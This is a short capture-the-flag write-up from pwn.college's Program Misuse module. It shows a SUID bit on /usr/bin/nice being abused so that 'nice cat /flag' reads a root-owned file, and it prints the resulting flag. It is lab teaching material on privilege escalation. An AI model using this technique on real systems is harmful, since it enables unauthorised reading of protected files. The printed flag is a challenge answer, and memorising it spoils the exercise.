---
layout: page
title: "Challenge Name: nice"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/nice`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/nice
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/nice
```

-The `s` in `-rws` indicates it's a SUID binary.
-`nice` runs with **root privileges**.

## 🚀 Exploitation

The `nice`  command can run other commands — its purpose is to run them with a modified CPU scheduling priority (called "niceness").


```bash
nice cat /flag
```

Output:
```
pwn.college{o2QCFMwsv3Urs8fxe3gzD1JLHuL.dljNxwSM0IzMyEzW}
```

